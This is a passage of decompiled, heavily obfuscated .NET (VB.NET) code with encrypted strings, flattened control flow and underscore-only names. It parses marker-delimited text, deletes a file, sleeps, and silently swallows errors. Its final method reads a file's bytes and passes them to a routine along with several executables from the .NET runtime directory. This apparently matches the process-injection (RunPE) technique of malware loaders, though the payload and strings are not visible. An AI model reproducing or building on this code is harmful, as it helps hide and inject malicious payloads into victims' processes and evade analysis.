			text3 = _003CModule_003E.__________(sizeof(short) + 22408, (int)((nint)Type.EmptyTypes.LongLength + 20922), 162);
			num2 = (nint)Type.EmptyTypes.LongLength + 4;
			goto IL_0638;
			IL_036b:
			string[] array4 = default(string[]);
			if (num6 < array4.Length)
			{
				text7 = array4[num6];
				num4 = -11838;
				if ((nint)Type.EmptyTypes.LongLength + -7075 != -7075)
				{
					goto IL_039a;
				}
				goto IL_054c;
			}
			try
			{
				File.Delete(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			text5 += _003CModule_003E._______<string>(4253958921u);
			result = text5;
			if ((nint)Type.EmptyTypes.LongLength + 27780 == 27780)
			{
				return result;
			}
			return result;
			IL_0672:
			result = _003CModule_003E.__________((int)(((uint)num3 % 230u == 1097529989) ? (-1576650676) : ((((1010 * num + 14 * num - (num6 * 3 + num6 - 1257847919)) & 2) != 2) ? ((nint)Type.EmptyTypes.LongLength + 941375870) : ((nint)Type.EmptyTypes.LongLength + 65179))), 68642, sizeof(double) + 133);
			return result;
			IL_0138:
			if (text6.Contains(_003CModule_003E._______<string>(3248682782u)))
			{
				text2 = _____________(text6);
				num7 = num4;
				num4 = -22424;
				if (num7 != -14822)
				{
					goto IL_05e5;
				}
			}
			num4 = -22424;
			if (text6.Contains(_003CModule_003E._______<string>(4144413825u)))
			{
				text3 = _____________(text6);
				if (num4 != -22424)
				{
					goto IL_0441;
				}
			}
			if (!text6.Contains(_003CModule_003E._______<string>(4199186373u)))
			{
				goto IL_020d;
			}
			text4 = _____________(text6);
			int num9 = default(int);
			if (num4 * 2130706432 - (-775 | num4) == -710788624)
			{
				int num8 = 1950443475;
				num2 = num8;
			}
			else
			{
				if ((uint)num9 / 452375622u + 3605 == 2477440793u)
				{
					return result;
				}
				num2 = (nint)Type.EmptyTypes.LongLength + 10;
			}
			goto IL_0638;
			IL_0365:
			string[] array5 = default(string[]);
			array4 = array5;
			num6 = 0;
			goto IL_036b;
			IL_05e5:
			array = array3;
			num = 0;
			goto IL_0213;
			IL_0494:
			nint num10 = (nint)Type.EmptyTypes.LongLength + 39688;
			if ((num6 & 0x3907C024) == 0)
			{
			}
			text4 = _003CModule_003E.__________((int)num10, (int)(((-(69 * num + 187 * num) | -70) != -70) ? ((nint)Type.EmptyTypes.LongLength + 1117107176) : (sizeof(byte) + 38368)), (int)((~(4 * ((uint)num3 / 54947u)) != (uint)num3 / 16777216u) ? ((nint)Type.EmptyTypes.LongLength + 35) : (sizeof(byte) + -1634100362)));
			num4 = 7587;
			if ((nint)Type.EmptyTypes.LongLength + -19575 == 1870)
			{
				goto IL_054c;
			}
			goto IL_05e5;
			IL_0587:
			text5 = _003CModule_003E.______<string>(1108436452u);
			string text9 = default(string);
			array5 = Strings.Split(text8, text9, -1, (CompareMethod)0);
			if ((int)((uint)num4 / 4194304u) - -33882112 != (int)((0x2015 ^ ((uint)num4 / 524288u)) >> 6))
			{
				num9 = ______________________._______;
				if (num9 * 43 + num9 * 85 != 974290426)
				{
					goto IL_0365;
				}
				return result;
			}
			return result;
			IL_0638:
			while (true)
			{
				switch (num2)
				{
				case 11:
					break;
				case 1:
					goto IL_0138;
				case 10:
					goto IL_020d;
				case 9:
					goto IL_0365;
				case 8:
					goto IL_03c6;
				case 3:
					goto IL_03e8;
				case 0:
					goto IL_0441;
				case 4:
					goto IL_0494;
				case 7:
					goto IL_052d;
				case 5:
					goto IL_056d;
				case 2:
					goto IL_0587;
				default:
					return result;
				}
				break;
				IL_03e8:
				array2[3] = text3;
				array2[4] = _003CModule_003E._____<string>(2815274875u);
				int num11 = _003CModule_003E.______________;
				num2 = (((int)(16 * ((uint)num11 / 456u + (uint)num11 / 456u)) - int.MinValue == (int)((uint)num11 / 3u)) ? ((nint)Type.EmptyTypes.LongLength + 745155490) : ((nint)Type.EmptyTypes.LongLength + 7));
			}
			goto IL_00c1;
			IL_052d:
			array2[5] = text4;
			array2[6] = _003CModule_003E.____<string>(3763093088u);
			text5 = string.Concat(array2);
			goto IL_0562;
			IL_056d:
			text9 = _003CModule_003E._______<string>(2111152995u);
			if (text8.Contains(text9))
			{
				goto IL_0587;
			}
			goto IL_0672;
			IL_039a:
			Thread.Sleep(10000);
			goto IL_03a4;
			IL_020d:
			num++;
			goto IL_0213;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E.______<string>(761048916u) + ex2.ToString());
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string _____________(string string_0)
	{
		try
		{
			string[] array = Strings.Split(string_0, _003CModule_003E.___<string>(1801837936u), -1, (CompareMethod)0);
			return array[1];
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			nint num = (nint)Type.EmptyTypes.LongLength + 63388;
			nint num2 = (nint)Type.EmptyTypes.LongLength + 62726;
			int num3 = global::___________._;
			nint num5;
			if ((((uint)num3 % 32768u) & 0x6C188000) == 0)
			{
				if ((0xFFFFDF1Bu ^ (uint)(num3 * 15 + num3)) != 0)
				{
					if (-8183 + num3 != -(0x21C9 & num3))
					{
						if (((0x1FEF ^ (num3 * 68 + 60 * num3)) & 0x31) == 33)
						{
							int num4 = _003CModule_003E._______________;
							num5 = ((-1482 + (0x840 & num4) != -1275) ? ((nint)Type.EmptyTypes.LongLength + 60) : 1886717413);
						}
						else
						{
							num5 = (nint)Type.EmptyTypes.LongLength + 1512644890;
						}
					}
					else
					{
						num5 = sizeof(Guid) + -1167070682;
					}
				}
				else
				{
					num5 = (nint)Type.EmptyTypes.LongLength + -1110697287;
				}
			}
			else
			{
				num5 = 1707050847;
			}
			string result = _003CModule_003E.__________((int)num, (int)num2, (int)num5);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool ______________(string string_0, string string_1)
	{
		try
		{
			string string_2 = string.Format(_003CModule_003E._____<string>(574444263u), string_0);
			byte[] byte_ = File.ReadAllBytes(string_1);
			int num = -11619;
			nint num2 = (nint)Type.EmptyTypes.LongLength + 1;
			while (true)
			{
				switch (num2)
				{
				default:
					if (!_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E._____<string>(3966942101u), string_2, byte_, bool_0: true, bool_1: true, bool_2: true))
					{
						if (!_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E._______<string>(2089763217u), string_2, byte_, bool_0: true, bool_1: true, bool_2: true))
						{
							if (!_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E._____<string>(1268431446u), string_2, byte_, bool_0: true, bool_1: true, bool_2: true))
							{
								if (_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E.______<string>(3054592498u), string_2, byte_, bool_0: true, bool_1: true, bool_2: true))
								{
									return true;
								}
								if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, string_2, byte_, bool_0: false, bool_1: true, bool_2: true))
								{
									return true;
								}
								return false;
							}
							break;
						}
						num = -5226;
						if ((nint)Type.EmptyTypes.LongLength + 12670 == -25351)
						{
							goto IL_010e;
						}
					}
					else if (num != -5625)
					{
						goto IL_010e;
					}
					return true;
				case 0:
					{
						return true;
					}
					IL_010e:
					return true;
				}
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
